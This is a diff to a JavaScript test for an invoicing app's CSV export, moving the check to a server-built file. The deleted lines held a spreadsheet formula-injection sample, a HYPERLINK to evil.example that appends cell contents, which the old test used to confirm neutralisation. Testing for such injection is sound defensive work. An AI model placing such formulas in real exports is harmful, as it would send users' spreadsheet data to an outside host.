@@ -67,6 +67,17 @@ const { api, retainerRecord, toastFn } = vi.hoisted(() => {
       agingBuckets: ok({ buckets: [] }),
       picklists: ok({}),
       create: ok({ id: 'recPaused' }),
+      // The Invoices page reads GET /api/invoices/query.
+      queryPath: (params = {}) => `/api/invoices/query?${new URLSearchParams(Object.entries(params).filter(([, v]) => v != null && v !== ''))}`,
+      query: vi.fn().mockResolvedValue({
+        data: {
+          records: [retainerRecord], total: 1, next_cursor: null,
+          aggregates: { count: 1, raised: 50000, totals: {}, aging: {}, by_project: [], raised_months: [], cleared_months: [] },
+          workspace: { count: 1, raised: 50000, totals: {}, aging: {}, by_status: { Paid: { count: 1, amount: 50000 } }, by_project: [], raised_months: [], cleared_months: [], facets: { months: [] }, recent_projects: [], overdue_top: [] },
+        },
+        etag: '"x"',
+      }),
+      exportCsv: ok({ blob: new Blob(['Invoice Number\n']), filename: 'invoices_2026-10-30.csv' }),
     }),
     webInvoices: ns({
       list: ok({ records: [retainerRecord], total: 1 }),
@@ -129,21 +140,20 @@ beforeEach(() => {
 afterEach(() => vi.unstubAllGlobals())
 
 describe('Invoices CSV export', () => {
-  it('neutralises formula text and keeps negative amounts numeric', async () => {
+  // The server writes the file (every invoice in scope, formula text
+  // neutralised — pinned in backend/tests/test_invoice_query_pg.py); the page
+  // asks for it and saves what comes back.
+  it('downloads the server-built file for all records', async () => {
     let blob = null
     URL.createObjectURL = vi.fn((b) => { blob = b; return 'blob:csv' })
     URL.revokeObjectURL = vi.fn()
     render(<MemoryRouter><Invoices /></MemoryRouter>)
     fireEvent.click(await screen.findByTitle('Download invoices as CSV'))
-    fireEvent.click(await screen.findByRole('button', { name: /All records \(1\)/ }))
+    await act(async () => { fireEvent.click(await screen.findByRole('button', { name: /All records \(1\)/ })) })
 
-    expect(blob).not.toBeNull()
-    const text = await blob.text()
-    const [header, row] = text.split('\n')
-    expect(header.split(',')).toContain('Remark')
-    expect(row).toContain(`"'=HYPERLINK(""https://evil.example/?d=""&B2,""Open invoice"")"`)
-    expect(row).not.toMatch(/(^|,)"?=HYPERLINK/)
-    expect(row.split(',')).toContain('-250')
+    await waitFor(() => expect(api.invoices.exportCsv).toHaveBeenCalledTimes(1))
+    expect(api.invoices.exportCsv.mock.calls[0][0]).not.toHaveProperty('q')
+    expect(await blob.text()).toBe('Invoice Number\n')
   })
 })
 
